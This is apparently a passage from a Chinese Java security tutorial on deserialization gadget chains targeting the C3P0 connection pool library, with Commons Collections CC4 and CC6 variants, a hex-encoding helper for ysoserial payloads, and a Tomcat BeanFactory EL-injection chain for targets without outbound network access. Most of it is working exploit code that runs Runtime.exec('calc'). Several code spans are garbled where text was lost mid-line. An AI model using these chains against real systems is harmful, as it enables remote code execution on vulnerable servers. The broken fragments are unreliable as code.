这里用CC4和CC6举例
    import com.alibaba.fastjson.JSON;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import java.beans.PropertyVetoException;
    import java.io.ByteArrayOutputStream;
    import java.io.IOException;
    import java.io.ObjectOutputStream;
    import java.io.StringWriter;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;
    public class C3P0Hex_CC6 {
        public static Map exp() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Class.forName("java.lang.Runtime")),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };
            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            HashMap hashMap1=new HashMap<>();
            LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,new ConstantTransformer(1));
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"Atkx");
            HashMap hashMap2=new HashMap<>();
            hashMap2.put(tiedMapEntry,"bbb");
            lazyMap.remove("Atkx");
            Class clazz=LazyMap.class;
            Field factoryField= clazz.getDeclaredField("factory");
            factoryField.setAccessible(true);
            factoryField.set(lazyMap,chainedTransformer);
            return hashMap2;
        }
        static void addHexAscii(byte b, StringWriter sw)
        {
            int ub = b & 0xff;
            int h1 = ub / 16;
            int h2 = ub % 16;
            sw.write(toHexDigit(h1));
            sw.write(toHexDigit(h2));
        }
        private static char toHexDigit(int h)
        {
            char out;
            if (h (transformers);
            TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
            PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
            priorityQueue.add(1);
            priorityQueue.add(2);
            return priorityQueue;
        }
        static void addHexAscii(byte b, StringWriter sw)
        {
            int ub = b & 0xff;
            int h1 = ub / 16;
            int h2 = ub % 16;
            sw.write(toHexDigit(h1));
            sw.write(toHexDigit(h2));
        }
        private static char toHexDigit(int h)
        {
            char out;
            if (h  calc.ser
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.InputStream;
    public class C3P0_all {
        public static void main(String[] args) throws IOException, ClassNotFoundException {
            InputStream in = new FileInputStream("L:\\JavaSecurity\\ysoserial-0.0.6\\calc.ser");
            byte[] data = toByteArray(in);
            in.close();
            String HexString = bytesToHexString(data, data.length);
            System.out.println(HexString);
        }
        public static byte[] toByteArray(InputStream in) throws IOException {
            byte[] classBytes;
            classBytes = new byte[in.available()];
            in.read(classBytes);
            in.close();
            return classBytes;
        }
        public static String bytesToHexString(byte[] bArray, int length) {
            StringBuffer sb = new StringBuffer(length);
            for(int i = 0; i 
            org.apache.tomcat
            tomcat-catalina
            8.5.0
            org.apache.tomcat.embed
            tomcat-embed-el
            8.5.15
漏洞点位于`org.apache.naming.factory.BeanFactory`
只有一个方法`getObjectInstance`  
回顾第一个链子URL，会发现最后调用的就是该方法，而不出网的利用方式就是通过本地类的加载来进行EL表达式注入
将URL链子执行的地方改成EL表达式即可，其余不用变
    import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
    import org.apache.naming.ResourceRef;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import javax.naming.Referenceable;
    import javax.naming.StringRefAddr;
    import javax.sql.ConnectionPoolDataSource;
    import javax.sql.PooledConnection;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.sql.SQLException;
    import java.sql.SQLFeatureNotSupportedException;
    import java.util.logging.Logger;
    public class C3P0_Local {
        public static class C3P0 implements ConnectionPoolDataSource, Referenceable {
            @Override
            public Reference getReference() throws NamingException {
                ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
                resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
                resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));
                return resourceRef;
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
        public static void unserialize(byte[] bytes) throws Exception{
            try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
                ObjectInputStream oin = new ObjectInputStream(bain)){
                oin.readObject();
            }
        }
        public static byte[] serialize(ConnectionPoolDataSource lp) throws Exception{
            PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
            Field connectionPoolDataSourceField = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            connectionPoolDataSourceField.setAccessible(true);
            connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);
            try(ByteArrayOutputStream baout = new ByteArrayOutputStream();
                ObjectOutputStream oout = new ObjectOutputStream(baout)){
                oout.writeObject(poolBackedDataSourceBase);
                return baout.toByteArray();
            }
        }
        public static void main(String[] args) throws Exception{
            C3P01.C3P0 exp = new C3P01.C3P0();
            byte[] bytes = serialize(exp);
            unserialize(bytes);
        }
    }